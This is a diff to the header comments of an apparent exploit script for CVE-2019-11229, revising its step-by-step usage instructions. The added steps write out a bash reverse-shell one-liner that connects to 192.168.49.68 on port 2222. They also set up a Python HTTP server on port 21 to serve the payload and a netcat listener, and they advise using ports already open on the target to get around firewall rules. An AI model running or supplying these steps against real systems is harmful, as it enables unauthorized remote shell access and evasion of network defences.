@@ -6,9 +6,17 @@
 # CVE: CVE-2019-11229
 #
 # Exploitation Steps
-# 1. python3 -m http.server 21                # Set up the server on a port already opened on the machine to avoid firewall rules
-# 2. nc -lvnp 2222                            # Set up a listener on a port which already is opened on the machine to avoid firewall rules
-# 3. python exploit.py
+# 1. Edit the script with proper credentials, IPs and Ports.
+
+# 2. Create a reverse shell payload to be run in bash
+#    nano shell.sh
+#    bash -c 'bash -i >& /dev/tcp/192.168.49.68/2222 0>&1'             # Change this to your IP try to use a port already opened on the machine
+# 
+# 3. python3 -m http.server 21                # Set up the server on a port already opened on the machine to avoid firewall rules
+
+# 4. nc -lvnp 2222                            # Set up a listener on a port which already is opened on the machine to avoid firewall rules
+
+# 5. python exploit.py
 
 # Troubleshooting
 # If you get the following error, you need to create a new user, there's an issue getting the user_ID.
